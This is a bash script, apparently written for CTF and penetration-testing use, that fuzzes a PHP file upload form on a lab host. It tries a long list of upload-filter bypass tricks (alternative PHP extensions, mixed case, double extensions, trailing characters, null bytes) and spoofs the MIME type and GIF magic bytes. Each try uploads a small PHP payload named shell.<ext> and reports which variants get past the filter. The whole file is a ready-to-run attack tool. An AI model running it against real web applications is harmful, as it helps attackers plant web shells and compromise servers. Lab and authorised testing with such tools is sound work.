
```
#!/usr/bin/env bash

# ==============================================================================
# PHP File Upload Extension Fuzzer
# Reusable script for CTFs / Penetration Testing
# ==============================================================================

# --- CONFIGURATION (Modify these for your target) ---
TARGET_URL="http://gettingstarted.htb/admin/upload-uploadify.php"
FILE_PARAM="Filedata"                          # HTML form field name for file upload
EXTRA_PARAMS=(-F "sessionHash=e554e86a29ef7d32cfe35c3521dd5029b405992d") # Add any extra -F or -H options here
MIME_TYPE="image/jpeg"                         # Content-Type to spoof
REJECT_MSG="Bad file"                         # String in response indicating rejection
# ---------------------------------------------------

# Comprehensive list of PHP extensions & bypass tricks
EXTENSIONS=(
  # Standard & alternative PHP extensions
  "php" "php2" "php3" "php4" "php5" "php6" "php7" "phps" "pht" "phtml" "pgif" "phar" "inc"
  # Uppercase / Mixed case variations
  "PHP" "PhP" "pHp" "PHTML"
  # Double extensions
  "php.jpg" "php.png" "jpg.php" "png.php" "php.jpeg"
  # Special characters / trailing chars
  "php." "php..." "php%20" "php%0a"
  # Null byte (legacy PHP < 5.3.4)
  "php%00.jpg" "php\x00.jpg"
)

# Create a temporary test payload with GIF magic bytes
TEMP_FILE=$(mktemp /tmp/payload_XXXXXX)
echo "GIF89a; <?php echo 'UPLOAD_SUCCESS_TEST_MARKER'; ?>" > "$TEMP_FILE"

# Clean up temp file on script exit
trap 'rm -f "$TEMP_FILE"' EXIT

echo "=================================================="
echo " Starting Extension Fuzzing on: $TARGET_URL"
echo "=================================================="

SUCCESS_COUNT=0

for ext in "${EXTENSIONS[@]}"; do
  # Perform upload request
  RESPONSE=$(curl -s -X POST "$TARGET_URL" \
    -F "${FILE_PARAM}=@${TEMP_FILE};filename=shell.${ext};type=${MIME_TYPE}" \
    "${EXTRA_PARAMS[@]}")

  # Check if response contains rejection message
  if echo "$RESPONSE" | grep -qi "$REJECT_MSG"; then
    echo -e "[\033[31mBLOCKED\033[0m] .$ext"
  else
    echo -e "[\033[32mSUCCESS\033[0m] .$ext  --> Response: $RESPONSE"
    ((SUCCESS_COUNT++))
  fi
done

echo "=================================================="
echo "Fuzzing complete. Total bypasses found: $SUCCESS_COUNT"
echo "=================================================="
```
